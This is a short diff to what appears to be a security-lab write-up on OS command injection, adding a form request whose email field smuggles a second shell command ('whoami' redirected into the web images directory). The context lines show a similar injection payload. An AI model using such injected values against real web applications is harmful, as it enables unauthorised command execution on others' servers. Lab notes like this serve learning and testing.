@@ -64,6 +64,12 @@ But here in this lab it's gonna be:
 ```shell
 x||whoami > /var/www/images/whodatbe.txt||&
 ```
+<br>
+
+### The cmd injection in the email param
+```
+csrf=xxxxxxxxxJF&name=joe&email=foo@email.com & whoami > /var/www/images/output.txt #&subject=secondattempt&message=foobar
+```
 
 Then URL encode it, I used the Decoder tab:
 ```URL
